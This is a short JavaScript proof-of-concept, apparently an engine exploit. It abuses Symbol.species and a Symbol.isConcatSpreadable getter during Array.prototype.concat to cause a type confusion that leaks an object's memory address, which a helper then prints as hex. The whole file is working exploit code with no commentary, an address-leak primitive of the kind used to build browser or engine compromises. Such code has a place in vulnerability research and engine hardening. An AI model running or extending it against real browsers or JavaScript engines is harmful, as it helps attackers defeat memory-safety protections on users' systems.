function convert(a1) {
    const v4 = new ArrayBuffer(8);
    a = v4;
    const v8 = new Float64Array(a);
    b = v8;
    const v11 = new Uint8Array(a);
    c = v11;
    b[0] = a1;
    ret = 0;
    for (i = 0; i < 8; i++) {
        ret += c[7 - i].toString(16);
    }
    return ret;
}
function leak(a33) {
    var a1 = [];
    for (let i37 = 0; i37 < 256; i37++) {
        a1[i37] = i37;
    }
    var a2 = [1234,1234];
    const v48 = new Function();
    var c = v48;
    function f50() {
        new_array = [99,99,99];
        return new_array;
    }
    c[Symbol.species] = f50;
    a1.constructor = c;
    const v59 = Symbol.isConcatSpreadable;
    function f60() {
        new_array[0] = 4.2;
        a2[0] = a33;
        return true;
    }
    a2.__defineGetter__(v59, f60);
    var res = a1.concat(a2);
    return convert(res[256]);
}
a = [1,2,3];
v = leak(a);
console.log(v);
